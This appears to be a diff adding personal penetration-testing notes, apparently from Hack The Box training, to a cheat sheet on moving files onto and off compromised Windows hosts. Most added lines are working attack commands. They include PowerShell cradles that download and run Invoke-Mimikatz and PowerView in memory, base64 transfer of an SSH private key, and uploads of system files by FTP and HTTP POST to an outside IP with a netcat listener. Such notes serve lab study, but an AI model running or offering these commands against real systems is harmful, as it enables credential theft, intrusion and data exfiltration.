@@ -114,4 +114,58 @@ python3 -m pyftpdlib -w -p 21 -u ignite -P 123
 				put C:\Users\raj\avni.txt
 
 iwr -uri http://<ip_address>/file.exe -outfile sh.exe
+
+-----------------------------------------------------------------------------------------------
+md5sum id_rsa
+cat id_rsa |base64 -w 0;echo
+
+PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hTVPZWhLQo="))
+-----------------------------------------------------------------------------------------------
+
+#file download from internet
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+#Directly run from memory
+PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+#using invoke-webrequest
+PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+#Installing the FTP Server Python3 Module - pyftpdlib
+sudo pip3 install pyftpdlib
+
+#Setting up a Python3 FTP Server
+sudo python3 -m pyftpdlib --port 21
+sudo python3 -m pyftpdlib --port 21 --write
+
+#Transferring Files from an FTP Server Using PowerShell
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+
+
+
+#Encode File Using PowerShell:
+PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+somx@htb[/htb]$ echo IyBDb3B5cmByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20ICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
+
+#Powershell web upload :
+pip3 install uploadserver
+python3 -m uploadserver
+
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+
+#PowerShell Base64 Web Upload:
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+somx@htb[/htb]$ nc -lvnp 8000
+somx@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
+
+
+
+
 ```
